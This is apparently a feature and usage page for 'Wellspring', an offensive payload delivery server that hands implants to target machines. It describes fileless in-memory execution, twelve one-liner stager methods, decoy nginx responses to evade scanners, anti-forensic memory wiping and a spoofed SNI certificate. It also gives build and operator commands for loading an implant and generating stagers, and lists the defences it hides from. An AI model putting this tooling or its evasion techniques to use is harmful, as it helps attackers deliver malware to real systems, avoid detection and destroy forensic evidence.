FEATURES

Twelve ways to deliver

Token-gated TLS delivery with AES-256-GCM encryption at rest. Fileless execution. Decoy infrastructure. Memory zeroing on shutdown.

Token-Gated Access

Every payload requires a valid token with configurable TTL, max uses, and source IP/CIDR lock. HMAC-SHA256 keyed hashing prevents timing attacks on token validation.

wellspring> generate p1 socat-tls --host 10.0.0.1 --port 4443
--ttl 1h --single-use --source-lock 10.0.0.0/24
[+] Token: a3f8c1... (1h TTL, single-use, locked)
256
AES-GCM Bits

Fileless Execution

memfd_create loaders execute payloads entirely in memory. /dev/shm staging uses tmpfs when memfd is unavailable. Zero disk footprint.

Dual TLS Listeners

HTTPS on :443 serves payloads at GET /p/<token>. Raw TLS on :4443 reads token from first line for socat connections.

Decoy Infrastructure

All HTTP responses use Server: nginx/1.24.0. Invalid tokens return an identical nginx 404, making the server indistinguishable from default nginx.

Anti-Forensics

SIGINT/SIGTERM trigger immediate zeroing of all payloads, tokens, and cryptographic keys before exit. Background goroutine enforces TTL purging with sensitive field zeroing via unsafe.StringData.

wellspring> token revoke a3f8c1...
[+] Token zeroed in-place via unsafe.StringData
wellspring> exit
Zeroing all payloads, tokens, keys... done

Stager Generation

Generate ready-to-use one-liner stagers for any loaded payload. cheatsheet command provides a standalone technique reference card.

ARCHITECTURE

Four-layer design

Clean separation between server, payload management, loader generation, and anti-forensics. All Go stdlib crypto.

1

Dual TLS Server

HTTPS and raw TLS listeners with ECDSA P-256 self-signed cert generation. Shared payload manager and token store. Decoy nginx responses for invalid requests.

2

Payload Manager

ELF/PE architecture auto-detection. AES-256-GCM encrypt-at-rest with runtime.KeepAlive to prevent compiler elision of zeroing operations.

3

Loader Registry

12 delivery methods auto-registered via init(). Each loader generates a one-liner stager with embedded token and connection parameters.

4

Anti-Forensics

Background TTL enforcer with sensitive field zeroing. Signal handlers zero all memory on shutdown. Callback tracker logs delivery events in-memory only.

GETTING STARTED

Build and deploy

Single Go binary with zero external dependencies. Build from source with Make.

build.sh
$ git clone https://github.com/Real-Fruit-Snacks/Wellspring
$ cd Wellspring && make build

# Generate TLS certificate
$ ./build/wellspring -gencert -sni cloudflare-dns.com

$ ls build/
wellspring  server.crt  server.key
usage.sh
# Start delivery server
$ ./build/wellspring -cert server.crt -key server.key

# Load a payload
wellspring> payload add ./implant --name undertow

# Generate all stagers
wellspring> generate p1 all --host 10.0.0.1 --port 443

# View delivery log
wellspring> callbacks
DETECTION AWARENESS

Know the boundaries

Hidden From

  • nmap — decoy nginx/1.24.0 responses
  • Web scanners — valid 404 for unknown paths
  • File inspection — AES-256-GCM at rest
  • Passive traffic — TLS 1.3 encrypted channels
  • Post-mortem — memory zeroed on shutdown

Visible To

  • TLS inspection — certificate analysis
  • Network monitoring — connection metadata
  • Host forensics — process listing, open ports
  • EDR / XDR — behavioral analysis
  • Memory forensics — runtime inspection
